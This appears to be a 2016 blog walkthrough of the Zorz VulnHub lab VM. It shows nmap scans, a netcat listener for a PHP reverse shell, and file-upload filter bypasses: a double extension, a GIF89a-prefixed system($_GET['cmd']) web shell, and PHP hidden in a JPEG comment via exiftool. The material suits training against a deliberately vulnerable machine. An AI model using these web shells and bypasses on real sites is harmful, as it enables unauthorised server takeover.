---
layout: post
title: Walkthrough Zorz
date: 2016-04-24 14:41:58.000000000 -03:00
type: post
published: true
status: publish
categories: []
tags:
- pen-testing
- security
- vulnhub
meta:
  _oembed_eec5dec5a08fd8d8d07381ab6eeaa95c: "{{unknown}}"
  _oembed_c72a6cd3e0b256ba14674e6e0a82302c: "{{unknown}}"
  _oembed_13e9cd768e25642c3e33583a9c66311b: "{{unknown}}"
  _oembed_9ac2122a7f160d7153740779af7b2e97: "{{unknown}}"
  _oembed_cbb863ad1e50e972b94eabf7b3de02e0: "{{unknown}}"
  _oembed_7b0ab40e0ec5e03d8cc9a4604a5172d8: "{{unknown}}"
  _oembed_f33e9faa7870affabb269ae39327f8f6: "{{unknown}}"
  _rest_api_published: '1'
  _rest_api_client_id: "-1"
  _publicize_job_id: '22116067033'
  _oembed_4f3c57ffbb9cca9ebed2ebaa58398216: "{{unknown}}"
  _oembed_87595add559759089909b230abd667ea: "{{unknown}}"
  _oembed_b84c7e6d53d0923db26206f282efcf88: "{{unknown}}"
  _oembed_47d8ee5beb0df89ddd226f5ec74265f0: "{{unknown}}"
  _oembed_406cda81d30521a47b69c7bda6fbc17f: "{{unknown}}"
author:
  login: tidlost
  email: tl.dr.mfw@gmail.com
  display_name: tidlost
  first_name: ''
  last_name: ''
---


I have been playing around with another vulnerable VM, this one is called Zorz, and can be found [here on vulnhub.](https://www.vulnhub.com/entry/tophatsec-zorz,117/) It is made by [Top-hat-sec.](https://www.top-hat-sec.com/r4v3ns-blog/another-vm-challenge-zorz)
First I imported the VM, but it automatically used eth0, instead of wlan. So once that was changed I could find the machine when I did my scan.

```
nmap -v 192.168.1.1/24
```

I have started running nmap in verbose mode, because it can be fun to see how nmap is working, and especially if it is really slow, and I start to doubt that everything is really working as it should.

```
sudo nmap -A -T4 -p- 192.168.1.104
```


So this stands for `-A`: Aggressive, and it includes: OS detection, version detection, script scanning, and traceroute.
`-T4` is how fast the scanning should be. `-T4` is "aggressive", but not `-T5` "insane". So it works out fast, but still reliable. Although it doesn't really matter. I think it is more useful when you need to scan hundreds of networks. In how much of a hurry you are. Granted T0 is slooow. `-T3` is the default.

```
Starting Nmap 7.00 ( https://nmap.org ) at 2016-04-23 21:23 CLST
Nmap scan report for zorz.dev (192.168.1.104)
Host is up (0.0011s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 48:bb:d8:38:b8:25:a6:6c:5e:7f:67:c9:ec:53:cc:ed (DSA)
|   2048 ec:55:48:93:28:90:f6:bf:3c:cd:e3:90:42:26:3b:5d (RSA)
|_  256 3f:0a:11:c9:59:73:be:df:f7:77:59:65:07:91:d7:d6 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:9A:0D:2F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS out CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE
HOP RTT     ADDRESS
1   1.08 ms zorz.dev (192.168.1.104)
```

Okay, so we just have ssh and 80. Let's start ZAP and Dir-browsing, because that can take some time. And let that roll while we checkout the browser.

## Challenge 1
So we find three challenges. Three ways to upload images to the server. So I guess that we want to bypass the image-restrictions and upload shells instead.
The first one was really straight-forward. It didn't really do any check. So I could just upload php-reverse-shell.php without any problems. But where was the file? I continued to play with Challenge 2 and 3. On the third one it says where the file was uploaded. It was uploaded into a dir called uploads3. So I figured the files for challenge 1 and 2 were to be found in uploads1 and uploads 2.
So I opened port 1234 in the firewall with the command:

```
ufw allow 1234
```

And then I used netcat to start listening in on that port, and get ready for the shell.

```
nc -v -l 1234
```

So `-v` stands for verbose. `-l` for listen. So that netcat know that it should listed for a incoming connection, and not establish connection itself. 1234 is the port that it should listen to.

Now we just click on the shell-file in uploads1 and the server connects to netcat.
So year, this was pretty easy. Basically no check whatsoever.

## Challenge 2
Now it is getting a bit more difficult. We cannot upload file that does not end with .png, .jpg, .gif.
But instead we can just rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php.

## Challenge 3
This challenge was a bit harder. Because somehow it was checking to see if the file itself was an image. I found to ways to bypass this check.
From this [great tutorial](http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html) I learned how to get around it. Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:

```
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
``` 
So that worked and I managed to get a shell up and running.
The second way to beat this challenge is to add the shell-code into a comment of a image-file.
First I looked for a simple jpg file online "jpg file:jpg". And then I inserted the php-code into the image comment with the following command.
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
```
Exiftool is a great tool to view and manipulate exif-data.
Then I had to rename the file
```
mv lo.jpg lo.php.jpg
```
Then upload it. When I then click on it the browser just outputs jibberish.
```
http://zorz.dev/uploads1/lo.php.jpg?cmd=ls
```
So when we run this in the browser it outputs the result on the webpage. So yeah, we have a shell.
Then we can move to
http://zorz.dev/uploads1/lo.php.jpg?cmd=cat%20/var/www/html/l337saucel337/SECRETFILE
And see the win-file.
There are many more tricks to bypass fileupload restrictions. Here are some:
https://pentestlab.wordpress.com/2012/11/29/bypassing-file-upload-restrictions/
http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html
